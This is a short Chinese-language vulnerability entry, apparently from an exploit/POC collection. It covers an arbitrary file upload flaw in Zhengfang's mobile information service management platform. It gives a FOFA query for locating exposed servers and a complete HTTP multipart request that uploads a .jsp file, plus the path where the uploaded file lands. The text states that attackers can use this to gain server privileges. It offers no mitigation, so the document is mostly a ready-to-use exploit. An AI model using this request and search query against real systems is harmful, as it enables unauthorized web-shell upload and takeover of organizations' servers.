# 正方移动信息服务管理系统oaMobile_fjUploadByType存在文件上传漏洞

正方软件股份有限公司移动信息服务管理平台存在任意文件上传漏洞。攻击者可通过任意文件上传获取服务器权限。

## fofa

```yaml
title="移动信息服务管理" || body="URL=/zftal-mobile"
```

## poc

```java
POST /zftal-mobile/oaMobile/oaMobile_fjUploadByType.html HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.1707.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Accept: */*
Content-Length: 457

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="yhm"

123
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="zid"

456
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="sign"

789
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="409.jsp"
Content-Type: text/plain

111
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

文件路径

` /zftal-mobile/oaFjUploadByType/409.jsp`



## 漏洞来源

- https://mp.weixin.qq.com/s/WrDhyx3wOdwMvSwkF-sXOQ